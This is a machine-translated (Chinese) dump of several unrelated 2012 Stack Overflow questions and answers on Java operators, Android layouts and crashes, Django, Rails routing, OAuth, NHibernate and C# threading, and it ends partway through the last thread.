# java - OR 运算符 || 之间的区别 和 | 在 Java 中？

> ID：10084524
> 
> 赞同：3
> 
> 时间：2012-04-10T07:08:17.363
> 
> 标签：java

> **可能重复：**
> [为什么我们通常使用`||`not `|`，有什么区别？](https://stackoverflow.com/questions/7101992/why-do-we-usually-use-not-what-is-the-difference)

任何人都可以解释Java中OR运算符（`||` 和）之间的区别和用法吗？`|`谢谢

例如：

```
if(a || b) {
// Do something.
} 
```

和

```
if(a | b) {
// Do something.
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T07:15:24.203

这很简单。[http://www.roseindia.net/help/java/o/java-operator.shtml](http://www.roseindia.net/help/java/o/java-operator.shtml)说：

> OR 运算符是一种条件运算符，用 | 表示。象征。它根据变量的状态返回真或假值，即在两个布尔表达式之间执行使用条件运算符的操作。
> 
> OR 运算符 (|) 类似于 Conditional-OR 运算符 (||)，如果其中一个或另一个操作数为真，则返回真。

**注意**：在`||`运算符中，如果有多个条件并且如果第一个条件`return true`则忽略其他条件，但在`|`运算符中所有条件都检查。

有关[http://docs.oracle.com/javase/tutorial/java/nutsandbolts/operators.html的更多信息](http://docs.oracle.com/javase/tutorial/java/nutsandbolts/operators.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T07:17:20.363

第一个是逻辑或。运算符的两边都作为`boolean`值处理，结果是`boolean`. 如果所讨论的变量本身不是`boolean`它们本身，那么如果它们是`0`or ，它们就会变为假`null`。

第二个是按位或运算符。这个通常只适用于整数。我逐位比较这两个值并给出结果数字。例如：

```
5   | 6   = 7    (decimal)
101 | 110 = 111  (binary) 
```

有关更多详细信息，请查看[维基百科：逻辑析取](http://en.wikipedia.org/wiki/Logical_disjunction "维基百科：逻辑析取")

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-10T07:13:43.250

如果使用运算符 || JVM 不会单独计算右手操作数。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-04-10T07:20:54.230

第一个是逻辑或，后者是按位或。但是，如果两个运算符（在您的示例中为 a 和 b）是布尔值，则按位或被视为逻辑或没有短路。这有时很方便。

例如，考虑：

```
boolean getTrue() {
    System.out.println("getTrue() called");
    return true;
}

public static void main(String[] args) {
    boolean a = getTrue() || getTrue();
    System.out.println("Result: " + a);
} 
```

上面只会打印一次“getTrue() called”，因为逻辑或 (||) 可以立即确定表达式的结果，而无需第二次调用 getTrue()。更改为按位或（即 boolean a = getTrue() | getTrue();）将导致两次调用 getTrue()。

使用按位 & 操作和 getFalse() 方法将产生类似的结果。

要考虑的另一个方面是按位运算符优先于逻辑运算符。因此，不建议按位混合它们，否则将在逻辑与之前执行，这可能会导致不良行为。可以使用方括号 () 进行修复，但我认为应该避免这种情况。

作为旁注，我不同意你的问题的否决票，这是一个有效的好问题！（给它+1）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-10T07:15:20.397

|| 运算符是布尔运算符

它可以用简单的英语解释为...

```
if ( a is true or b is true)
{
 //do soemthing
} 
```

的| 运算符是逻辑运算符

它仅适用于整数类型，如 int、char 等...

它是对两个操作数的按位或运算

例子：

```
bool a = true;
bool b = false;

bool c = a | b;

//c will  be true

if(a | b )
{

}

is same as

c = a | b;

if ( c == true)
{
  do something;
} 
```

# ruby-on-rails - Rails：嵌套在另一个资源索引上的单一资源

> ID：10084525
> 
> 赞同：0
> 
> 时间：2012-04-10T07:08:17.853
> 
> 标签：ruby-on-rails, ruby-on-rails-3, routes

我有一个用户（复数）和一个订阅（单数）控制器。我想知道是否可以设置如下路线：

```
/users/subscription/edit 
```

这意味着编辑当前用户的订阅。我看到的所有例子都像`/users/1/subscription/edit`

这样，任何用户都可以指向同一个 url，它将指向他们的设置页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:17:36.803

制作如下路线：

```
match '/users/subscription/edit' => 'subscription#edit' : as => "subscription_edit"
OR
match '/users/subscription/edit', :controller => 'subscription', :action => 'edit' : as => "subscription_edit" 
```

# android - 用于 GPS 定位的 sqlite 数据库

> ID：10084527
> 
> 赞同：2
> 
> 时间：2012-04-10T07:08:22.270
> 
> 标签：android, sql

我是安卓新手。我遵循了[http://www.youtube.com/watch?v=1JyC_xv20yE](http://www.youtube.com/watch?v=1JyC_xv20yE)
的教程 程序没有错误。但模拟器给出“*应用程序意外停止*”

日志文件为

```
04-11 19:50:14.295: D/AndroidRuntime(338): Shutting down VM
04-11 19:50:14.295: W/dalvikvm(338): threadid=1: thread exiting with uncaught exception (group=0x40015560)
04-11 19:50:14.315: E/AndroidRuntime(338): FATAL EXCEPTION: main
04-11 19:50:14.315: E/AndroidRuntime(338): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.sql/com.sql.SQLiteExample}: java.lang.ClassCastException: com.sql.SQLiteExample
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1647)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.app.ActivityThread.access$1500(ActivityThread.java:117)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:931)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.os.Handler.dispatchMessage(Handler.java:99)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.os.Looper.loop(Looper.java:123)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.app.ActivityThread.main(ActivityThread.java:3683)
04-11 19:50:14.315: E/AndroidRuntime(338):  at java.lang.reflect.Method.invokeNative(Native Method)
04-11 19:50:14.315: E/AndroidRuntime(338):  at java.lang.reflect.Method.invoke(Method.java:507)
04-11 19:50:14.315: E/AndroidRuntime(338):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-11 19:50:14.315: E/AndroidRuntime(338):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-11 19:50:14.315: E/AndroidRuntime(338):  at dalvik.system.NativeStart.main(Native Method)
04-11 19:50:14.315: E/AndroidRuntime(338):  at com.sql.SQLiteExample.onCreate(SQLiteExample.java:28)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
04-11 19:50:14.315: E/AndroidRuntime(338):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1611)
04-11 19:50:14.315: E/AndroidRuntime(338):  ... 11 more
04-11 19:55:14.435: I/Process(338): Sending signal. PID: 338 SIG: 9
04-11 20:02:38.005: W/dalvikvm(367): threadid=1: thread exiting with uncaught exception (group=0x40015560)
04-11 20:02:38.045: E/AndroidRuntime(367): FATAL EXCEPTION: main
04-11 20:02:38.045: E/AndroidRuntime(367): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.sql/com.sql.SQLiteExample}: java.lang.ClassCastException: com.sql.SQLiteExample
04-11 20:02:38.045: E/AndroidRuntime(367):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1647)
04-11 20:02:38.045: E/AndroidRuntime(367):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1663)
04-11 20:02:38.045: E/AndroidRuntime(367):  at android.app.ActivityThread.access$1500(ActivityThread.java:117)
04-11 20:02:38.045: E/AndroidRuntime(367):  at android.os.Looper.loop(Looper.java:123)
04-11 20:02:38.045: E/AndroidRuntime(367):  at android.app.ActivityThread.main(ActivityThread.java:3683)
04-11 20:02:38.045: E/AndroidRuntime(367):  at java.lang.reflect.Method.invokeNative(Native Method)
04-11 20:02:38.045: E/AndroidRuntime(367):  at java.lang.reflect.Method.invoke(Method.java:507)
04-11 20:02:38.045: E/AndroidRuntime(367):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-11 20:02:38.045: E/AndroidRuntime(367):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-11 20:02:38.045: E/AndroidRuntime(367):  at dalvik.system.NativeStart.main(Native Method)
04-11 20:02:38.045: E/AndroidRuntime(367): Caused by: java.lang.ClassCastException: com.sql.SQLiteExample
04-11 20:02:38.045: E/AndroidRuntime(367):  at com.sql.SQLiteExample.onCreate(SQLiteExample.java:28)
04-11 20:02:38.045: E/AndroidRuntime(367):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
04-11 20:02:38.045: E/AndroidRuntime(367):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1611)
04-11 20:02:38.045: E/AndroidRuntime(367):  ... 11 more
04-11 20:07:38.165: I/Process(367): Sending signal. PID: 367 SIG: 9 
```

SQLiteexample.java 作为

```
package com.sql;

import android.app.Activity;
import android.app.Dialog;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class SQLiteExample extends Activity implements OnClickListener{
    /** Called when the activity is first created. */
    Button sqlUpdate,sqlView;
    EditText sqllocation,sqllongi,sqllati;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.sqliteexample);
        sqlUpdate = (Button)findViewById(R.id.bsqlupdate);
        sqlView = (Button)findViewById(R.id.bsqlopenview);
        sqllongi = (EditText)findViewById(R.id.longi);
        sqllati = (EditText)findViewById(R.id.lati);
        sqllocation = (EditText)findViewById(R.id.location1);
        sqlView.setOnClickListener((android.view.View.OnClickListener) this);
        sqlUpdate.setOnClickListener((android.view.View.OnClickListener) this);

    }

    public void onClick(View arg0) {
        // TODO Auto-generated method stub
        switch (arg0.getId())
        {
        case R.id.bsqlupdate:
            boolean wrk=true;
            try{
            String location = sqllocation.getText().toString();
            String longi = sqllongi.getText().toString();
            String lati = sqllongi.getText().toString();
            Cornte entry = new Cornte(this);
            entry.open();
            entry.createEntry(location , longi, lati);

            entry.close();
            }catch (Exception e){
                wrk= false;
                String error=e.toString();
                Dialog d=new Dialog(this);
                d.setTitle("NO!!!");
                TextView tv =new TextView(this);
                tv.setText(error);
                d.setContentView(tv);
                d.show(); 

            }finally{
                if(wrk)
                {
                    Dialog d=new Dialog(this);
                    d.setTitle("YUP!!!");
                    TextView tv =new TextView(this);
                    tv.setText("SUCCESS");
                    d.setContentView(tv);
                    d.show();
                }
            }
            break;
        case R.id.bsqlopenview:
            Intent i =new Intent("com.sql.SQLVIEW");
            startActivity(i);

            break;
        }
    }

    @Override
    public void onClick(DialogInterface dialog, int which) {
        // TODO Auto-generated method stub

    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T07:41:04.550

错误在于：

```
sqlView.setOnClickListener((android.view.View.OnClickListener) this); 
```

您可以在 logcat 中看到它：

```
04-11 20:02:38.045: E/AndroidRuntime(367):  at com.sql.SQLiteExample.onCreate(SQLiteExample.java:28) 
```

我会解释一下，首先尝试学习使用 logcat，大多数情况下你应该从错误的底部开始并搜索带有你的命名空间的行（在本例中为 com.sql.SQLiteExample），现在你可以看到什么方法您的应用程序崩溃，在此示例中：“onCreate”，但最重要的是发生错误的文件 + 行号！

ClassCastException 意味着你想把一个对象放入一个不是它的对象中......学校示例你有 BaseObjects 'Animal' 它有一些 ChildObjects 'Dogg' & 'Cat' 但现在你正在尝试执行以下操作：

```
Apple apple = giveMeThatApple();
Animal a = apple; 
```

好吧，那是行不通的，因为“苹果”与“动物”类无关……希望您理解……

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T04:05:14.860

我得到了解决方案..错误是由于 import android.content.DialogInterface.OnClickListener 的错误导入；而不是 import View.OnClickListener [setOnClickListener(View.OnClickListener) 类型的 View 不适用于参数 (SequencerActivity) back.setOnClickListener(this);](https://stackoverflow.com/questions/6071799/setonclicklistenerview-onclicklistener-in-the-type-view-is-not-applicable-for)

# css - 在样式表中设置类而不是标记

> ID：10084528
> 
> 赞同：3
> 
> 时间：2012-04-10T07:08:22.713
> 
> 标签：css

我正在尝试将我对 CSS 的贫乏知识应用到我正在进行的一个小玩具项目中，我不得不在我的 HTML 标记中声明列宽，这让我无休止地烦恼。

有没有办法让我可以，而不是

```
<div class="grid_4"></div> 
```

使用类似的东西

```
<div id="leftNav"></div> 
```

并在样式表中将 grid_4 类应用于 id 为 leftNav 的元素？

在我看来，它看起来像这样

```
#leftNav {
    apply-class: grid_4;
} 
```

CSS中有类似的东西吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:12:28.323

不是在常规 CSS 中，不是。

虽然有 CSS 预处理器，它创建了一种新的迷你语言，然后被处理成常规的 CSS，增加了这些和更多的特性。少见，[萨斯](http://sass-lang.com/)。[_](http://lesscss.org/)

# android - 如何添加我的条形码并使用 zxing 对其进行解码？

> ID：10084529
> 
> 赞同：1
> 
> 时间：2012-04-10T07:08:34.183
> 
> 标签：android, zxing

我有一个特定的条形码格式。我需要使用 zxing 对其进行解码。

如何使用 zxing 对其进行解码？

请帮我。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T09:14:22.273

您可以通过两种方式使用 ZXing

1.  意图方法
2.  在不使用意图方法的情况下将 ZXing 集成到您的代码中。仅当您对 ZXing 库有充分的了解时才应使用此方法。

ZXing 的开发者鼓励我们使用第一种方法。

但既然您提到您在应用程序中使用 ZXing 作为库，请按照此链接[http://damianflannery.wordpress.com/2011/06/13/integrate-zxing-barcode-scanner-into-your-中的步骤操作android-app-native-using-eclipse/](http://damianflannery.wordpress.com/2011/06/13/integrate-zxing-barcode-scanner-into-your-android-app-natively-using-eclipse/)

所有的步骤都有详细的解释。

**注意：**除非绝对必要，否则不要使用此方法。ZXing 的开发者鼓励使用 core/ 作为库，因为它是一个库。您不应该将 android/ 用作库，因为它不是。他们真的不鼓励复制和粘贴 android/.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T12:37:48.203

您将`Reader`使用读取条形码所需的任何逻辑来实现接口。有关它如何工作的线索，请参阅其他实现。

# windows-phone-7 - 取消订阅已卸载应用程序的 WP7 通知

> ID：10084531
> 
> 赞同：1
> 
> 时间：2012-04-10T07:09:00.837
> 
> 标签：windows-phone-7, push-notification, mpns

我有一个在 WP7 上运行的 toast 通知系统。当我发送通知时，所有注册的设备都会收到 toast 通知。

但是，如果有人卸载了应用程序，我会继续尝试发送到注册的设备（实际上，我会要求微软服务发送到不可用的设备）。是否可以检测到是否有人卸载了该应用程序，然后我可以将其从要发送的设备列表中删除。或者，如果应用程序取消订阅 toast 通知，Ms services 可以告诉我吗？

我的注册设备列表无限增长....

在此先感谢您的帮助，最好的问候

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T09:59:32.550

您无法检测用户是否删除了该应用，但您可以在发送通知时随时查看订阅状态返回码！

[在此处](http://msdn.microsoft.com/en-us/library/ff941100%28VS.92%29.aspx)查看返回代码，特别是 SubscriptionStatus != Active 的位置

# python - “验证验证码错误。” 请求 access_token 时

> ID：10084532
> 
> 赞同：1
> 
> 时间：2012-04-10T07:09:01.430
> 
> 标签：python, facebook, facebook-graph-api, oauth

我为了代表用户访问 Facebook API，必须获得 OAuth access_token，该过程有据可查（尽管它似乎是 FB 的一些未记录的要求），但有时我会收到此“验证错误验证码。” 尝试为 access_token 交换验证码时。

似乎有很多人遇到这样的麻烦，大多数时候 redirect_uri 似乎是问题，但这里的 redirect_uri 很好（它与传递给身份验证对话框的完全相同，以斜杠结尾并执行没有时髦的字符或尾随的查询字符串，我阅读了关于这个问题的几乎所有关于这个问题的线程，并且没有一个建议的解决方案能解决我的问题）

最有趣的是，当我检查我的日志时，我在其中写入了我使用的确切请求 url，并手动尝试获取访问令牌，然后它就可以工作了。就像用户登录时请求失败但一段时间后工作一样。

因此，它毕竟工作的事实似乎表明请求很好，但在 Facebook 方面存在问题，比如是否涉及一些复制在身份验证对话框执行它的时间之间没有完成，我尝试将代码交换为令牌。

我设置了重试机制，希望两次调用之间的延迟足够，第二次调用会成功，但它也不起作用。

此外，它大部分时间都在工作，我无法区分它何时工作和何时失败，只有用户会改变。

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T12:44:10.923

我刚刚碰到这个问题并解决了它。

问题是我在 oauth 调用中将 redirect_uri 指定为[http://apps.facebook.com/myapp/](http://apps.facebook.com/myapp/)而不是[https://apps.facebook.com/myapp/](https://apps.facebook.com/myapp/)。

有点奇怪的是，如果我将它们输入到浏览器地址字段中，完全相同的参数会起作用，而不是作为来自应用程序的服务器端请求。

可以基于每个用户指定是否要使用或不使用 HTTPS 浏览 Facebook，因此我建议您在测试身份验证流程时使用两种模式下的设置进行测试。

# android - Android 按钮边框阴影

> ID：10084537
> 
> 赞同：5
> 
> 时间：2012-04-10T07:09:31.927
> 
> 标签：android, button, shadow

Button 视图中的 Shadow 属性为文本提供阴影。如何给 Button 的右下边框加上阴影？如下图所示：

![在此处输入图像描述](../Images/9798481028320ce77b9fbd5b7c6c9fca.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-03-03T12:44:06.237

你可以试试。我在我的项目中使用它。我给按钮的右侧和底部边框提供阴影。

> 按钮 xml

```
<Button
      android:id="@+id/buttonSignIn"
      android:layout_width="fill_parent"
      android:layout_height="50dp"
      android:background="@drawable/button_dropshadow"
      android:textColor="000000"
      android:text="Sign In" /> 
```

> 在可绘制文件中添加 button_dropshadow.xml

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
<item>
    <layer-list>
        <item android:left="5dp" android:top="5dp">
            <shape>
                <corners android:radius="3dp" />
                <solid android:color="#000000" />
            </shape>
        </item>
        <item android:bottom="2dp" android:right="2dp">
            <shape>
                <gradient android:angle="270" 
                    android:endColor="#ffffff" android:startColor="#ffffff" />
                <stroke android:width="1dp" android:color="#000000" />
                <corners android:radius="4dp" />
                <padding android:bottom="10dp" android:left="10dp" 
                    android:right="10dp" android:top="10dp" />
            </shape>
        </item>
    </layer-list>
</item>

</selector> 
```

谢谢你。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-04-18T03:28:30.887

尝试使用选择器制作自己的按钮 9-patch 图像：

**btn_normal.9.png**：![普通的](../Images/94171ab6a13d7fb7a24daf147d97430a.png)

**btn_pressed.9.png**：![按下](../Images/b50c61c3b78b7280d8cdab4c51ce43ae.png)

**btn_focused.9.png**：![专注](../Images/d0c9ac41247c8d5f9829468f8e462a42.png)

**btn_selector.xml**：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_selected="true" android:drawable="@drawable/btn_focused" />
    <item android:state_focused="true" android:drawable="@drawable/btn_focused" />
    <item android:state_pressed="true" android:drawable="@drawable/btn_pressed" />
    <item android:drawable="@drawable/btn_normal" />
</selector> 
```

并添加`android:background="@drawable/btn_selector"`按钮的属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:18:38.680

[这](http://www.anotherandroidblog.com/2011/06/29/drop-shadow-linearlayout/)是我发现并可以提供帮助的 blob 帖子。它只能在相对布局中工作。创建一个与您的按钮大小相同的 View 组件，并将其放在下面：

```
<Button
    android:id="+@id\my_button"
    android:layout_below="@id/some_layout_item"
    android:layout_width="100dp"
    android:layout_height="5dp"
    >
</Button>
<View
    android:layout_below="@id/my_button"
    android:layout_width="100dp"
    android:layout_height="5dp"
    android:background="@drawable/drop_shadow"
    >
</View> 
```

将阴影创建为可绘制对象 (drop_shadow.xml)：

```
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android=”http://schemas.android.com/apk/res/android”&gt;    
    <gradient
        android:startColor="@color/cream_dark"
        android:endColor="@color/cream"
        android:angle="270"
        >
    </gradient>
</shape> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-15T09:54:58.147

我的按钮的背景是这样设置的

```
<?xml version="1.0" encoding="utf-8"?>
<shape xmlns:android="http://schemas.android.com/apk/res/android" >
    <gradient
     android:startColor="@android:color/holo_green_dark"
     android:endColor="@android:color/holo_green_light"
     android:angle="90">
   </gradient>
     <stroke
     android:width="1px"
     android:color="@android:color/darker_gray" />
</shape> 
```

阴影的效果可以通过在原始按钮形状下添加第二个形状来完成，将其颜色更改为黑色或灰色的较暗颜色。但阴影应该与按钮的形状相同。

```
 <?xml version="1.0" encoding="utf-8"?>
 <shape xmlns:android="http://schemas.android.com/apk/res/android" >

     <solid android:color="@android:color/darker_gray"/>

 </shape> 
```

要重叠不同的项目，我们必须使用“层列表”资源并包含以前的形状。阴影应该出现在第一位，然后是带有一些位移的原始按钮。在本例中，我们在按钮底部创建阴影，偏移量为 4px。

```
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android" >
   <item android:drawable="@drawable/shadow"/>
   <item
     android:drawable="@drawable/button"
     android:bottom="4px" 
     android:right="4px"
     />  
 </layer-list> 
```

现在将按钮的背景设置为 layerlist drawable。这应该部分完成。

# django - Django：Django模型中的方法调用

> ID：10084541
> 
> 赞同：0
> 
> 时间：2012-04-10T07:09:59.387
> 
> 标签：django

我有一个这样的模型

```
class User(model):
    username = XXX
    addr1 = xxx

def get_username(self):
    return self.username + 'some message'

def get_addr1(self):
    return self.addr1 + 'some string' 
```

和代码我想遍历每个对象，如果存在带有 get_+field.name 的函数，则调用该方法，否则返回字段本身。

有没有办法做到这一点？下面是伪代码：

```
for field in each_obj._fields.itervalues():
    if get_+fieldname exists then:
        return that function call
    else:
        return self.field.name 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T08:21:51.973

看看我如何在这里伪造 python 属性[http://ilian.ini.org/faking-attributes-in-python-classes/](http://ilian.i-n-i.org/faking-attributes-in-python-classes/)并在评论中检查替代解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:31:21.920

您可以调用`hasattr(obj, 'get_'+fieldname)`以了解该方法是否存在，但最好的方法是`__getattr__`在您的类中实际覆盖，然后让 Python 完成剩下的工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T08:47:59.277

```
for var in obj.__dict__:
    try:
        print getattr(obj, 'get_%s' %var)()
    except(AttributeError):
        print var 
```

# lwuit - 当一个文本字段的约束应用于其他表单上的其他字段时，这是一个错误吗

> ID：10084548
> 
> 赞同：3
> 
> 时间：2012-04-10T07:10:57.603
> 
> 标签：lwuit, lwuit-resource-editor, lwuit-textfield

我已经测试了很多次并且得到了奇怪的行为。Lwuit 1.5 版。

我`Form`用`TextFields`它们创建了一些。（Form1，Form2，Form3）。当我通过资源编辑器在 Form1 上将数字约束设置为其中之一`TextFields`，然后使用 form1 运行 MIDP 应用程序时，它工作正常，但是当用户转到 Form2 时，所有这些都`TextFields`变为数字约束，而无法更改用户的输入顺序。并且当返回 Form1`TextFields`时也变得具有数字约束。我已经在没有任何额外代码的情况下对其进行了测试。资源编辑器的所有导航。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T11:59:17.540

在显示表单之前或之后对代码中的 TextFields 设置约束，而不是通过资源编辑器设置数字（数字、数字密码、...、其他数字）约束，解决了此错误引起的问题。

# django - Django FileFields 使用 DB 模型的值

> ID：10084551
> 
> 赞同：0
> 
> 时间：2012-04-10T07:11:12.680
> 
> 标签：django, filefield

我已经定义了这些模型，

```
class Header(models.Model):
    date1 = models.DateField()

class Details(models.Model):
    header = models.ForeignKey(Header),
    field1 = models.CharField(max_length=10),
    archive = models.FileField(upload_to='x') 
```

是否可以设置存档，以便将upload_to 设置为details.field1 + header.date1：​​例如如果header.date1 = 2012-04-28 和details.field1 = 'sample'，则自动存储上传的文件testing.doc在 MEDIA_ROOT/2012-04-28/sample/testing.doc 下。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:35:31.683

如果您阅读 Django 文档（此处：[https](https://docs.djangoproject.com/en/1.4/ref/models/fields/#django.db.models.FileField.upload_to) : //docs.djangoproject.com/en/1.4/ref/models/fields/#django.db.models.FileField.upload_to ），您会注意到 upload_to 可以是可调用的（那是一个函数），它接受两个参数，`instance`并且`filename`

# nhibernate - 获取没有数据库访问权限的惰性多对一对象的 ID？

> ID：10084553
> 
> 赞同：0
> 
> 时间：2012-04-10T07:11:18.247
> 
> 标签：nhibernate, lazy-loading

我想知道这是否可能，

我有一个 A 类，其 B 类的 Id 属性与惰性多对一关系连接。而且我想在不连接数据库的情况下获得 ABID（确保不加载整个 B 实体）。在 NhibernatE 有可能吗？

A 是多，b 是一 :)

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-10T11:42:04.267

是的，这是默认行为。如果您`A`从数据库中检索然后访问`A.B.Id`这将不会命中数据库。如果您访问除 Id 字段之外的任何其他属性，它将导致 NHibernate`B`从数据库中检索。

# java - 将在运算符条件下循环的程序

> ID：10084556
> 
> 赞同：0
> 
> 时间：2012-04-10T07:11:43.393
> 
> 标签：java, loops, operators

我正在编写一个 java 程序，它将计算到用户输入的数字。用户只能输入 1-10 之间的数字。

例如：

如果用户输入`6`输出将是：

```
1 2 3 4 5 6 
```

如何仅使用运算符和`while`和`if`语句来做到这一点？

这是我的代码。我一直在痛苦地试图弄清楚为什么我的代码不起作用。提前致谢！

```
import java.util.Scanner;

public class loop_lab {

    public static void main(String[] args) {
        System.out.println("Hi user, input any number that is between 1-10");{
            Scanner input = new Scanner(System.in);
            int num1 = input.nextInt();
            int num2 = 0;

            if (1<=num1 && num1>=10);
            num2=0;

            while (num2 < num1)
            System.out.println(""+(num2 + 1));
                num2++;

            }
            }
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:18:55.403

我认为问题在于代码块（{} 之间的东西）。尤其是看看`while`​​-loop 的行为。什么应该在循环中，什么不是？此外，您的`if`-statement 是空的。这 ; 关闭由`if`.

IDE 可以通过应用语法格式来帮助您检测这些错误。您的代码中的注释看起来像是来自 Eclipse。尝试`ctrl-shift-f`（或在菜单中查找）。这会自动格式化和缩进你的代码，这样更容易检测结构中的错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T07:19:40.690

首先，你的条件检查应该使用一个`or`和大括号；并分配`0`给`num1`，以防止在用户输入 1-10 范围之外的任何内容时循环运行：

```
if (num1 < 1 || num1 > 10){
    num1=0;
} 
```

你还可以改进你的循环：

```
while (num2 < num1) {
    System.out.println( ""+ num2++ );
} 
```

另外，正如 user689893 所说，检查您的`{}`块。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T07:24:03.857

试试这个

```
import java.util.Scanner;

public class loop_lab {
    public static void main(String[] args) {
        // TODO Auto-generated method stub

        System.out.println("Hi user, input any number that is between 1-10");
        Scanner input = new Scanner(System.in);
        int num1 = input.nextInt();
        int num2 = 1;

        if (1<=num1 && num1>=10){
            num2=1;

            while (num2 <= num1)
            {
                System.out.println("" + num2);
                num2++;
            }
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-10T07:55:21.797

在while循环中只是改变

```
 while (num2 < num1){
        if(num2==0)
         System.out.println((num2 + 1));
        else{
           num2++;
           System.out.println(num2);

        }

            } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-10T07:25:44.157

`if`有一个杂散的尾随结果`;` ，下一行*总是*运行。

`{`我强调在/中包含与条件语句和循环有关的单行语句`}`。这有助于使代码块的开始和结束变得清晰。我之前关于代码缩进的评论也是确定代码块开始和结束位置的一个因素。

# ios5 - MKOverlayView drawMapRect:zoomScale:inContext: 什么时候调用？

> ID：10084566
> 
> 赞同：1
> 
> 时间：2012-04-10T07:12:36.687
> 
> 标签：ios5, mkmapview, mkannotation

我正在检查面包屑示例：

[http://developer.apple.com/library/ios/#samplecode/Breadcrumb/Introduction/Intro.html](http://developer.apple.com/library/ios/#samplecode/Breadcrumb/Introduction/Intro.html)

在 iphone 模拟器上，如果我从 MKMapView 模拟初始美国视图之外的某个地方，drawMapRect:zoomScale:inContext: 在它应该绘制某些东西时不会被调用。

这是为什么？什么时候调用该方法？我该怎么做才能让它发挥作用？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-10T20:40:04.240

这是因为限制设置为在当前位置周围显示高度和宽度为世界大小四分之一的区域内的路线。

在 CrumbPath.m 中检查此代码

```
// bite off up to 1/4 of the world to draw into.
    MKMapPoint origin = points[0];
    origin.x -= MKMapSizeWorld.width / 8.0;
    origin.y -= MKMapSizeWorld.height / 8.0;
    MKMapSize size = MKMapSizeWorld;
    size.width /= 4.0;
    size.height /= 4.0;
    boundingMapRect = (MKMapRect) { origin, size };
    MKMapRect worldRect = MKMapRectMake(0, 0, MKMapSizeWorld.width, MKMapSizeWorld.height);
    boundingMapRect = MKMapRectIntersection(boundingMapRect, worldRect); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-07T13:29:26.087

您使用的是哪个版本的 xCode？

这些是应用程序的要求：

构建要求：

iOS 5.0 SDK 或更高版本

运行时要求：

iOS 4.0 或更高版本

# c# - 以线程安全的方式枚举列表

> ID：10084572
> 
> 赞同：1
> 
> 时间：2012-04-10T07:12:56.917
> 
> 标签：c#, .net, multithreading, thread-safety

假设我在一个类中有一个列表，它将在多线程场景中使用。

```
public class MyClass
{
     List<MyItem> _list= new List<MyItem>();
     protected object SyncRoot { 
      get {
         return ((IList)_list).SyncRoot;
        }
     }

     public void Execute1()
     {
        lock(SyncRoot)
        {
             foreach(var item in _list) DoSomething(item);
        }
     }

     public void Execute2()
     {
         Item[] list;
         lock(SyncRoot)
         {
            list=_list.ToArray();
         }
